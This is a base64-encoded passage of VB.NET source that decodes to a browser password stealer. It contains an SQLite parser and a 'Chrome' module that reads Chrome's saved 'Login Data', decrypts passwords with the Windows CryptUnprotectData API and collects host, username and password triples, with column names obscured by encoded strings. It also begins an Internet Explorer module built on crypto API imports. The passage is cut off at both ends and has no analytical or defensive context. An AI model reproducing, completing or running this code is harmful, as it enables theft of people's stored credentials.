KyBSZWNfSGVhZGVyX1NpemUgKyBjb3VudGVyLCBGaWVsZF9TaXplKGspLnNpemUpDQogICAgICAg ICAgICAgICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMyBUaGVuDQogICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgIHRhYmxlX2VudHJpZXMob2wgKyBpKS5jb250ZW50KGspID0g U3lzdGVtLlRleHQuRW5jb2RpbmcuQmlnRW5kaWFuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMs IGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBjb3VudGVyLCBGaWVsZF9TaXplKGspLnNp emUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAg ICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGVfZW50cmllcyhv bCArIGkpLmNvbnRlbnQoaykgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmlu ZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIGNvdW50ZXIsIEZpZWxk X1NpemUoaykuc2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAg ICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB0YWJsZV9lbnRyaWVzKG9s ICsgaSkuY29udGVudChrKSA9IENTdHIoQ29udmVydFRvSW50ZWdlcihlbnRfb2Zmc2V0ICsgUmVj X0hlYWRlcl9TaXplICsgY291bnRlciwgRmllbGRfU2l6ZShrKS5zaXplKSkNCiAgICAgICAgICAg ICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICAgICAgY291bnRlciA9IGNvdW50ZXIg KyBGaWVsZF9TaXplKGspLnNpemUNCiAgICAgICAgICAgICAgICBOZXh0DQogICAgICAgICAgICBO ZXh0DQogICAgICAgIEVsc2VJZiBkYl9ieXRlcyhPZmZzZXQpID0gJkg1IFRoZW4gJ2ludGVybmFs IG5vZGUNCiAgICAgICAgICAgIERpbSBMZW5ndGggQXMgVUludDE2ID0gQ29udmVydFRvSW50ZWdl cihPZmZzZXQgKyAzLCAyKSAtIDENCiAgICAgICAgICAgIERpbSBlbnRfb2Zmc2V0IEFzIFVJbnQx Ng0KDQogICAgICAgICAgICBGb3IgaSBhcyBpbnRlZ2VyID0gMCBUbyBMZW5ndGggU3RlcCAxDQog ICAgICAgICAgICAgICAgZW50X29mZnNldCA9IENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0ICsgMTIg KyAoaSAqIDIpLCAyKQ0KDQogICAgICAgICAgICAgICAgUmVhZFRhYmxlRnJvbU9mZnNldCgoQ29u dmVydFRvSW50ZWdlcihPZmZzZXQgKyBlbnRfb2Zmc2V0LCA0KSAtIDEpICogcGFnZV9zaXplKQ0K ICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBSZWFkVGFibGVGcm9tT2Zmc2V0KChDb252 ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIDgsIDQpIC0gMSkgKiBwYWdlX3NpemUpDQogICAgICAgIEVu ZCBJZg0KDQogICAgICAgIFJldHVybiBUcnVlDQogICAgRW5kIEZ1bmN0aW9uDQoNCg0KICAgIFB1 YmxpYyBGdW5jdGlvbiBSZWFkVGFibGUoQnlWYWwgVGFibGVOYW1lIEFzIFN0cmluZykgQXMgQm9v bGVhbg0KICAgICAgICAnDQogICAgICAgIERpbSBmb3VuZCBBcyBJbnRlZ2VyID0gLTENCg0KICAg ICAgICBGb3IgaSBhcyBpbnRlZ2VyID0gMCBUbyBtYXN0ZXJfdGFibGVfZW50cmllcy5MZW5ndGgg U3RlcCAxDQogICAgICAgICAgICBJZiBtYXN0ZXJfdGFibGVfZW50cmllcyhpKS5pdGVtX25hbWUu VG9Mb3dlcigpLkNvbXBhcmVUbyhUYWJsZU5hbWUuVG9Mb3dlcigpKSA9IDAgVGhlbg0KICAgICAg ICAgICAgICAgIGZvdW5kID0gaQ0KICAgICAgICAgICAgICAgIEV4aXQgRm9yDQogICAgICAgICAg ICBFbmQgSWYNCiAgICAgICAgTmV4dA0KDQogICAgICAgIElmIGZvdW5kID0gLTEgVGhlbiBSZXR1 cm4gRmFsc2UNCg0KICAgICAgICBEaW0gZmllbGRzKCkgPSBtYXN0ZXJfdGFibGVfZW50cmllcyhm b3VuZCkuc3FsX3N0YXRlbWVudC5TdWJzdHJpbmcobWFzdGVyX3RhYmxlX2VudHJpZXMoZm91bmQp LnNxbF9zdGF0ZW1lbnQuSW5kZXhPZigiKCIpICsgMSkuU3BsaXQoIiwiKQ0KDQogICAgICAgIEZv ciBpIGFzIGludGVnZXIgPSAwIFRvIGZpZWxkcy5MZW5ndGggLSAxIFN0ZXAgMQ0KICAgICAgICAg ICAgZmllbGRzKGkpID0gTFRyaW0oZmllbGRzKGkpKQ0KDQogICAgICAgICAgICBEaW0gaW5kZXgg PSBmaWVsZHMoaSkuSW5kZXhPZigiICIpDQoNCiAgICAgICAgICAgIElmIGluZGV4ID4gMCBUaGVu IGZpZWxkcyhpKSA9IGZpZWxkcyhpKS5TdWJzdHJpbmcoMCwgaW5kZXgpDQoNCiAgICAgICAgICAg IElmIGZpZWxkcyhpKS5JbmRleE9mKCJVTklRVUUiKSA9IDAgVGhlbg0KICAgICAgICAgICAgICAg IEV4aXQgRm9yDQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgUmVEaW0gUHJlc2Vy dmUgZmllbGRfbmFtZXMoaSkNCiAgICAgICAgICAgICAgICBmaWVsZF9uYW1lcyhpKSA9IGZpZWxk cyhpKQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIE5leHQNCg0KICAgICAgICBSZXR1cm4g UmVhZFRhYmxlRnJvbU9mZnNldCgobWFzdGVyX3RhYmxlX2VudHJpZXMoZm91bmQpLnJvb3RfbnVt IC0gMSkgKiBwYWdlX3NpemUpDQogICAgRW5kIEZ1bmN0aW9uDQoNCg0KICAgIFB1YmxpYyBGdW5j dGlvbiBHZXRSb3dDb3VudCgpIEFzIEludGVnZXINCiAgICAgICAgUmV0dXJuIHRhYmxlX2VudHJp ZXMuTGVuZ3RoDQogICAgRW5kIEZ1bmN0aW9uDQoNCg0KICAgIFB1YmxpYyBGdW5jdGlvbiBHZXRW YWx1ZShCeVZhbCByb3dfbnVtIEFzIEludGVnZXIsIEJ5VmFsIGZpZWxkIEFzIEludGVnZXIpIEFz IFN0cmluZw0KICAgICAgICBJZiByb3dfbnVtID49IHRhYmxlX2VudHJpZXMuTGVuZ3RoIFRoZW4g UmV0dXJuIE5vdGhpbmcNCiAgICAgICAgSWYgZmllbGQgPj0gdGFibGVfZW50cmllcyhyb3dfbnVt KS5jb250ZW50Lkxlbmd0aCBUaGVuIFJldHVybiBOb3RoaW5nDQoNCiAgICAgICAgUmV0dXJuIHRh YmxlX2VudHJpZXMocm93X251bSkuY29udGVudChmaWVsZCkNCiAgICBFbmQgRnVuY3Rpb24NCg0K DQogICAgUHVibGljIEZ1bmN0aW9uIEdldFZhbHVlKEJ5VmFsIHJvd19udW0gQXMgSW50ZWdlciwg QnlWYWwgZmllbGQgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGZvdW5kIEFzIElu dGVnZXIgPSAtMQ0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIGZpZWxkX25hbWVz Lkxlbmd0aCBTdGVwIDENCiAgICAgICAgICAgIElmIGZpZWxkX25hbWVzKGkpLlRvTG93ZXIoKS5D b21wYXJlVG8oZmllbGQuVG9Mb3dlcigpKSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgIGZvdW5k ID0gaQ0KICAgICAgICAgICAgICAgIEV4aXQgRm9yDQogICAgICAgICAgICBFbmQgSWYNCiAgICAg ICAgTmV4dA0KDQogICAgICAgIElmIGZvdW5kID0gLTEgVGhlbiBSZXR1cm4gTm90aGluZw0KDQog ICAgICAgIFJldHVybiBHZXRWYWx1ZShyb3dfbnVtLCBmb3VuZCkNCiAgICBFbmQgRnVuY3Rpb24N Cg0KDQogICAgUHVibGljIEZ1bmN0aW9uIEdldFRhYmxlTmFtZXMoKSBBcyBTdHJpbmcoKQ0KICAg ICAgICBEaW0gcmV0VmFsIEFzIFN0cmluZygpID0gbm90aGluZw0KICAgICAgICBEaW0gYXJyID0g MA0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIG1hc3Rlcl90YWJsZV9lbnRyaWVz Lkxlbmd0aCAtIDEgU3RlcCAxDQogICAgICAgICAgICBJZiBtYXN0ZXJfdGFibGVfZW50cmllcyhp KS5pdGVtX3R5cGUgPSAidGFibGUiIFRoZW4NCiAgICAgICAgICAgICAgICBSZURpbSBQcmVzZXJ2 ZSByZXRWYWwoYXJyKQ0KICAgICAgICAgICAgICAgIHJldFZhbChhcnIpID0gbWFzdGVyX3RhYmxl X2VudHJpZXMoaSkuaXRlbV9uYW1lDQogICAgICAgICAgICAgICAgYXJyID0gYXJyICsgMQ0KICAg ICAgICAgICAgRW5kIElmDQogICAgICAgIE5leHQNCg0KICAgICAgICBSZXR1cm4gcmV0VmFsDQoN CiAgICBFbmQgRnVuY3Rpb24NCg0KICAgICcgQ29uc3RydWN0b3INCiAgICBQdWJsaWMgU3ViIE5l dyhCeVZhbCBiYXNlTmFtZSBBcyBTdHJpbmcpDQoNCiAgICAgICAgSWYgRmlsZS5FeGlzdHMoYmFz ZU5hbWUpIFRoZW4NCiAgICAgICAgICAgIEZpbGVPcGVuKDEsIGJhc2VOYW1lLCBPcGVuTW9kZS5C aW5hcnksIE9wZW5BY2Nlc3MuUmVhZCwgT3BlblNoYXJlLlNoYXJlZCkNCiAgICAgICAgICAgIERp bSBhc2kgQXMgU3RyaW5nID0gU3BhY2UoTE9GKDEpKQ0KICAgICAgICAgICAgRmlsZUdldCgxLCBh c2kpDQogICAgICAgICAgICBGaWxlQ2xvc2UoMSkNCg0KICAgICAgICAgICAgZGJfYnl0ZXMgPSBT eXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGFzaSkNCg0KICAgICAgICAgICAg SWYgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoZGJfYnl0ZXMsIDAsIDE1 KS5Db21wYXJlVG8oIlNRTGl0ZSBmb3JtYXQgMyIpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAg IFRocm93IE5ldyBFeGNlcHRpb24oIk5vdCBhIHZhbGlkIFNRTGl0ZSAzIERhdGFiYXNlIEZpbGUi KQ0KICAgICAgICAgICAgICAgIEVuZA0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAg IElmIGRiX2J5dGVzKDUyKSA8PiAwIFRoZW4NCiAgICAgICAgICAgICAgICBUaHJvdyBOZXcgRXhj ZXB0aW9uKCJBdXRvLXZhY3V1bSBjYXBhYmxlIGRhdGFiYXNlIGlzIG5vdCBzdXBwb3J0ZWQiKQ0K ICAgICAgICAgICAgICAgIEVuZA0KICAgICAgICAgICAgRWxzZUlmIENvbnZlcnRUb0ludGVnZXIo NDQsIDQpID49IDQgVGhlbg0KICAgICAgICAgICAgICAgIFRocm93IE5ldyBFeGNlcHRpb24oIk5v IHN1cHBvcnRlZCBTY2hlbWEgbGF5ZXIgZmlsZS1mb3JtYXQiKQ0KICAgICAgICAgICAgICAgIEVu ZA0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIHBhZ2Vfc2l6ZSA9IENvbnZlcnRU b0ludGVnZXIoMTYsIDIpDQogICAgICAgICAgICBlbmNvZGluZyA9IENvbnZlcnRUb0ludGVnZXIo NTYsIDQpDQoNCiAgICAgICAgICAgIElmIGVuY29kaW5nID0gMCBUaGVuIGVuY29kaW5nID0gMQ0K DQogICAgICAgICAgICAnTm93IHdlIHJlYWQgdGhlIHNxbGl0ZV9tYXN0ZXIgdGFibGUNCiAgICAg ICAgICAgICdPZmZzZXQgaXMgMTAwIGluIGZpcnN0IHBhZ2UNCiAgICAgICAgICAgIFJlYWRNYXN0 ZXJUYWJsZSgxMDApDQogICAgICAgIEVuZCBJZg0KICAgIEVuZCBTdWINCkVuZCBDbGFzcw0KTW9k dWxlIENocm9tZQ0KDQogICAgUHVibGljIGNQYXNzIEFzIFN0cmluZw0KICAgIFB1YmxpYyBTdWIg R2V0Q2hyb21lKCkNCiAgICAgICAgVHJ5DQoJICAgRGltIGRhdGFwYXRoIEFzIFN0cmluZyA9IEVu dmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3BlY2lhbEZvbGRlci5Mb2NhbEFw cGxpY2F0aW9uRGF0YSkgKyAiXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4g RGF0YSINCg0KICAgICAgIA0KICAgICAgICAgICAgRGltIFNRTERhdGFiYXNlID0gTmV3IFNRTGl0 ZUhhbmRsZXIoZGF0YXBhdGgpDQogICAgICAgICAgICBTUUxEYXRhYmFzZS5SZWFkVGFibGUoImxv Z2lucyIpDQoNCiAgICAgICAgICAgIElmIEZpbGUuRXhpc3RzKGRhdGFwYXRoKSBUaGVuDQoNCiAg ICAgICAgICAgICAgICBEaW0gaG9zdCwgdXNlciwgcGFzcyBBcyBTdHJpbmcNCg0KICAgICAgICAg ICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIFNRTERhdGFiYXNlLkdldFJvd0NvdW50KCkg LSAxIFN0ZXAgMQ0KICAgICAgICAgICAgICAgICAgICBob3N0ID0gU1FMRGF0YWJhc2UuR2V0VmFs dWUoaSwgWzI0XS5bNDJdKCJiM0pwWjJsdVgzVnliQT09IikpDQogICAgICAgICAgICAgICAgICAg IHVzZXIgPSBTUUxEYXRhYmFzZS5HZXRWYWx1ZShpLCBbMjRdLls0Ml0oImRYTmxjbTVoYldWZmRt RnNkV1U9IikpDQogICAgICAgICAgICAgICAgICAgIHBhc3MgPSBEZWNyeXB0KFN5c3RlbS5UZXh0 LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU1FMRGF0YWJhc2UuR2V0VmFsdWUoaSwgInBhc3N3 b3JkX3ZhbHVlIikpKQ0KDQogICAgICAgICAgICAgICAgICAgIElmICh1c2VyIDw+ICIiKSBBbmQg KHBhc3MgPD4gIiIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIGNQYXNzID0gKCJ+fn5+ fkNocm9tZX5+fn5+IiAmIHZiTmV3TGluZSAmICJIb3N0OiAiICYgaG9zdCAmIHZiTmV3TGluZSAm ICJVc2VybmFtZTogIiAmIHVzZXIgJiB2Yk5ld0xpbmUgJiAiUGFzc3dvcmQ6ICIgJiBwYXNzICYg dmJOZXdMaW5lICYgIn5+fn5+fn5+fn4iIF8NCiAgICAgICAgICAgICAgICAgICAgICAgICYgdmJO ZXdMaW5lICYgIiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRl eHQoY1Bhc3MpDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgIE5l eHQNCg0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0K ICAgICAgICAgICAgDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgU3ViDQogICAgPERsbEltcG9y dCgiQ3J5cHQzMi5kbGwiLCBTZXRMYXN0RXJyb3I6PVRydWUsIENoYXJTZXQ6PVN5c3RlbS5SdW50 aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0LkF1dG8pPiBfDQogICAgUHJpdmF0ZSBGdW5jdGlv biBDcnlwdFVucHJvdGVjdERhdGEoQnlSZWYgcERhdGFJbiBBcyBEQVRBX0JMT0IsIEJ5VmFsIHN6 RGF0YURlc2NyIEFzIFN0cmluZywgQnlSZWYgcE9wdGlvbmFsRW50cm9weSBBcyBEQVRBX0JMT0Is IEJ5VmFsIHB2UmVzZXJ2ZWQgQXMgSW50UHRyLCBCeVJlZiBwUHJvbXB0U3RydWN0IEFzIENSWVBU UFJPVEVDVF9QUk9NUFRTVFJVQ1QsIEJ5VmFsIGR3RmxhZ3MgQXMgSW50ZWdlciwgQnlSZWYgcERh dGFPdXQgQXMgREFUQV9CTE9CKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQogICAgPEZs YWdzKCk+IEVudW0gQ3J5cHRQcm90ZWN0UHJvbXB0RmxhZ3MNCiAgICAgICAgQ1JZUFRQUk9URUNU X1BST01QVF9PTl9VTlBST1RFQ1QgPSAmSDENCiAgICAgICAgQ1JZUFRQUk9URUNUX1BST01QVF9P Tl9QUk9URUNUID0gJkgyDQogICAgRW5kIEVudW0NCiAgICA8U3RydWN0TGF5b3V0KExheW91dEtp bmQuU2VxdWVudGlhbCwgQ2hhclNldDo9Q2hhclNldC5Vbmljb2RlKT4gU3RydWN0dXJlIENSWVBU UFJPVEVDVF9QUk9NUFRTVFJVQ1QNCiAgICAgICAgUHVibGljIGNiU2l6ZSBBcyBJbnRlZ2VyDQog ICAgICAgIFB1YmxpYyBkd1Byb21wdEZsYWdzIEFzIENyeXB0UHJvdGVjdFByb21wdEZsYWdzDQog ICAgICAgIFB1YmxpYyBod25kQXBwIEFzIEludFB0cg0KICAgICAgICBQdWJsaWMgc3pQcm9tcHQg QXMgU3RyaW5nDQogICAgRW5kIFN0cnVjdHVyZQ0KICAgIDxTdHJ1Y3RMYXlvdXQoTGF5b3V0S2lu ZC5TZXF1ZW50aWFsLCBDaGFyU2V0Oj1DaGFyU2V0LlVuaWNvZGUpPiBTdHJ1Y3R1cmUgREFUQV9C TE9CDQogICAgICAgIFB1YmxpYyBjYkRhdGEgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgcGJE YXRhIEFzIEludFB0cg0KICAgIEVuZCBTdHJ1Y3R1cmUNCiAgICBGdW5jdGlvbiBEZWNyeXB0KEJ5 VmFsIERhdGFzKCkgQXMgQnl0ZSkgQXMgU3RyaW5nDQogICAgICAgIERpbSBpbmosIE9ycyBBcyBO ZXcgREFUQV9CTE9CDQogICAgICAgIERpbSBHaGFuZGxlIEFzIEdDSGFuZGxlID0gR0NIYW5kbGUu QWxsb2MoRGF0YXMsIEdDSGFuZGxlVHlwZS5QaW5uZWQpDQogICAgICAgIGluai5wYkRhdGEgPSBH aGFuZGxlLkFkZHJPZlBpbm5lZE9iamVjdCgpDQogICAgICAgIGluai5jYkRhdGEgPSBEYXRhcy5M ZW5ndGgNCiAgICAgICAgR2hhbmRsZS5GcmVlKCkNCiAgICAgICAgQ3J5cHRVbnByb3RlY3REYXRh KGluaiwgTm90aGluZywgTm90aGluZywgTm90aGluZywgTm90aGluZywgMCwgT3JzKQ0KICAgICAg ICBEaW0gUmV0dXJuZWQoKSBBcyBCeXRlID0gTmV3IEJ5dGUoT3JzLmNiRGF0YSkge30NCiAgICAg ICAgTWFyc2hhbC5Db3B5KE9ycy5wYkRhdGEsIFJldHVybmVkLCAwLCBPcnMuY2JEYXRhKQ0KICAg ICAgICBEaW0gVGhlU3RyaW5nIEFzIFN0cmluZyA9IEVuY29kaW5nLkRlZmF1bHQuR2V0U3RyaW5n KFJldHVybmVkKQ0KICAgICAgICBSZXR1cm4gVGhlU3RyaW5nLlN1YnN0cmluZygwLCBUaGVTdHJp bmcuTGVuZ3RoIC0gMSkNCiAgICBFbmQgRnVuY3Rpb24NCg0KRW5kIE1vZHVsZQ0KDQpQdWJsaWMg TW9kdWxlIElFNzgNCiAgICAnDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfQ0xBU1NfSEFTSCBBcyBV SW50ZWdlciA9ICg0IDw8IDEzKQ0KICAgIFByaXZhdGUgQ29uc3QgQUxHX1RZUEVfQU5ZIEFzIFVJ bnRlZ2VyID0gKDApDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfQ0xBU1NfREFUQV9FTkNSWVBUIEFz IFVJbnRlZ2VyID0gKDMgPDwgMTMpDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfVFlQRV9TVFJFQU0g QXMgVUludGVnZXIgPSAoNCA8PCA5KQ0KICAgIFByaXZhdGUgQ29uc3QgQUxHX1RZUEVfQkxPQ0sg QXMgVUludGVnZXIgPSAoMyA8PCA5KQ0KDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfU0lEX0RFUyBB cyBVSW50ZWdlciA9IDENCiAgICBQcml2YXRlIENvbnN0IEFMR19TSURfUkM0IEFzIFVJbnRlZ2Vy ID0gMQ0KICAgIFByaXZhdGUgQ29uc3QgQUxHX1NJRF9SQzIgQXMgVUludGVnZXIgPSAyDQogICAg UHJpdmF0ZSBDb25zdCBBTEdfU0lEX01ENSBBcyBVSW50ZWdlciA9IDMNCiAgICBQcml2YXRlIENv bnN0IEFMR19TSURfU0hBIEFzIFVJbnRlZ2VyID0gNA0KDQogICAgUHVibGljIENvbnN0IE1TX0RF Rl9QUk9WIEFzIFN0cmluZyA9ICJNaWNyb3NvZnQgQmFzZSBDcnlwdG9ncmFwaGljIFByb3ZpZGVy IHYxLjAiDQoNCiAgICBQdWJsaWMgQ29uc3QgUFJPVl9SU0FfRlVMTCBBcyBVSW50ZWdlciA9IDEN CiAgICAnUHVibGljIENvbnN0IENSWVBUX1ZFUklGWUNPTlRFWFQgQXMgVUludGVnZXIgPSAmSEYw MDAwMDAwDQogICAgUHVibGljIENvbnN0IENSWVBUX0VYUE9SVEFCTEUgQXMgVUludGVnZXIgPSAm SDENCg0KICAgIFB1YmxpYyBSZWFkT25seSBDQUxHX01ENSBBcyBVSW50ZWdlciA9IChBTEdfQ0xB U1NfSEFTSCBPciBBTEdfVFlQRV9BTlkgT3IgQUxHX1NJRF9NRDUpDQogICAgUHVibGljIFJlYWRP bmx5IENBTEdfREVTIEFzIFVJbnRlZ2VyID0gKEFMR19DTEFTU19EQVRBX0VOQ1JZUFQgT3IgQUxH X1RZUEVfQkxPQ0sgT3IgQUxHX1NJRF9ERVMpDQogICAgUHVibGljIFJlYWRPbmx5IENBTEdfUkMy IEFzIFVJbnRlZ2VyID0gKEFMR19DTEFTU19EQVRBX0VOQ1JZUFQgT3IgQUxHX1RZUEVfQkxPQ0sg T3IgQUxHX1NJRF9SQzIpDQogICAgUHVibGljIFJlYWRPbmx5IENBTEdfUkM0IEFzIFVJbnRlZ2Vy ID0gKEFMR19DTEFTU19EQVRBX0VOQ1JZUFQgT3IgQUxHX1RZUEVfU1RSRUFNIE9yIEFMR19TSURf UkM0KQ0KICAgIEZyaWVuZCBDb25zdCBDQUxHX1NIQSBBcyBJbnRlZ2VyID0gKCg0IDw8IDEzKSBP ciA0KQ0KDQogICAgRnJpZW5kIENvbnN0IEhQX0hBU0hWQUwgQXMgSW50ZWdlciA9ICZIMg0KDQog ICAgPFN0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpPiBfDQogICAgUHVibGljIFN0 cnVjdHVyZSBTdHJpbmdJbmRleEhlYWRlcg0KICAgICAgICBQdWJsaWMgZHdXSUNLIEFzIEludGVn ZXINCiAgICAgICAgUHVibGljIGR3U3RydWN0U2l6ZSBBcyBJbnRlZ2VyDQogICAgICAgIFB1Ymxp YyBkd0VudHJpZXNDb3VudCBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBkd1Vua0lkIEFzIElu dGVnZXINCiAgICAgICAgUHVibGljIGR3VHlwZSBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBk d1VuayBBcyBJbnRlZ2VyDQogICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgPFN0cnVjdExheW91dChM YXlvdXRLaW5kLlNlcXVlbnRpYWwpPiBfDQogICAgUHVibGljIFN0cnVjdHVyZSBTdHJpbmdJbmRl eEVudHJ5DQogICAgICAgIFB1YmxpYyBkd0RhdGFPZmZzZXQgQXMgSW50ZWdlcg0KICAgICAgICBQ dWJsaWMgZnRJbnNlcnREYXRlVGltZSBBcyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMu Q29tVHlwZXMuRklMRVRJTUUNCiAgICAgICAgUHVibGljIGR3RGF0YVNpemUgQXMgSW50ZWdlcg0K ICAgIEVuZCBTdHJ1Y3R1cmUNCg0KDQogICAgQ29uc3QgQ3J5cHREbGwgQXMgU3RyaW5nID0gImFk dmFwaTMyLmRsbCINCiAgICBDb25zdCBLZXJuZWxEbGwgQXMgU3RyaW5nID0gImtlcm5lbDMyLmRs bCINCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHREbGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENy eXB0QWNxdWlyZUNvbnRleHQoQnlSZWYgcGhQcm92IEFzIEludFB0ciwgQnlWYWwgcHN6Q29udGFp bmVyIEFzIFN0cmluZywgQnlWYWwgcHN6UHJvdmlkZXIgQXMgU3RyaW5nLCBCeVZhbCBkd1Byb3ZU eXBlIEFzIFVJbnRlZ2VyLCBCeVZhbCBkd0ZsYWdzIEFzIFVJbnRlZ2VyKSBBcyBCb29sZWFuDQog ICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0 RXJyb3I6PVRydWUpPiBfDQogICAgRnJpZW5kIEZ1bmN0aW9uIENyeXB0R2V0SGFzaFBhcmFtKEJ5 VmFsIGhIYXNoIEFzIEludFB0ciwgQnlWYWwgcGFyYW0gQXMgSW50ZWdlciwgQnlWYWwgZGlnZXN0 IEFzIEJ5dGUoKSwgQnlSZWYgbGVuZ3RoIEFzIEludGVnZXIsIEJ5VmFsIGZsYWdzIEFzIEludGVn ZXIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHRE bGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENyeXB0UmVsZWFzZUNvbnRleHQoQnlWYWwgaFBy b3YgQXMgSW50UHRyLCBCeVZhbCBkd0ZsYWdzIEFzIFVJbnRlZ2VyKSBBcyBCb29sZWFuDQogICAg RW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KENyeXB0RGxsKT4gXw0KICAgIFB1YmxpYyBG dW5jdGlvbiBDcnlwdERlcml2ZUtleShCeVZhbCBoUHJvdiBBcyBJbnRQdHIsIEJ5VmFsIEFsZ2lk IEFzIFVJbnRlZ2VyLCBCeVZhbCBoQmFzZURhdGEgQXMgSW50UHRyLCBCeVZhbCBkd0ZsYWdzIEFz IFVJbnRlZ2VyLCBCeVJlZiBwaEtleSBBcyBJbnRQdHIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVu Y3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHREbGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9u IENyeXB0Q3JlYXRlSGFzaChCeVZhbCBoUHJvdiBBcyBJbnRQdHIsIEJ5VmFsIEFsZ2lkIEFzIFVJ bnRlZ2VyLCBCeVZhbCBoS2V5IEFzIEludFB0ciwgQnlWYWwgZHdGbGFncyBBcyBVSW50ZWdlciwg QnlSZWYgcGhIYXNoIEFzIEludFB0cikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQog ICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3J5cHRIYXNo RGF0YShCeVZhbCBoSGFzaCBBcyBJbnRQdHIsIEJ5VmFsIHBiRGF0YSBBcyBJbnRQdHIsIEJ5VmFs IGR3RGF0YUxlbiBBcyBJbnRlZ2VyLCBCeVZhbCBkd0ZsYWdzIEFzIFVJbnRlZ2VyKSBBcyBCb29s ZWFuDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KENyeXB0RGxsKT4gXw0KICAg IFB1YmxpYyBGdW5jdGlvbiBDcnlwdEVuY3J5cHQoQnlWYWwgaEtleSBBcyBJbnRQdHIsIEJ5VmFs IGhIYXNoIEFzIEludFB0ciwgQnlWYWwgRmluYWwgQXMgQm9vbGVhbiwgQnlWYWwgZHdGbGFncyBB cyBVSW50ZWdlciwgQnlWYWwgcGJEYXRhIEFzIEJ5dGUoKSwgQnlSZWYgcGR3RGF0YUxlbiBBcyBV SW50ZWdlciwgXw0KICAgICBCeVZhbCBkd0J1ZkxlbiBBcyBVSW50ZWdlcikgQXMgQm9vbGVhbg0K ICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJs aWMgRnVuY3Rpb24gQ3J5cHREZWNyeXB0KEJ5VmFsIGhLZXkgQXMgSW50UHRyLCBCeVZhbCBoSGFz aCBBcyBJbnRQdHIsIEJ5VmFsIEZpbmFsIEFzIEJvb2xlYW4sIEJ5VmFsIGR3RmxhZ3MgQXMgVUlu dGVnZXIsIEJ5VmFsIHBiRGF0YSBBcyBCeXRlKCksIEJ5UmVmIHBkd0RhdGFMZW4gQXMgVUludGVn ZXIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHRE bGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENyeXB0RGVzdHJveUhhc2goQnlWYWwgaEhhc2gg QXMgSW50UHRyKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0 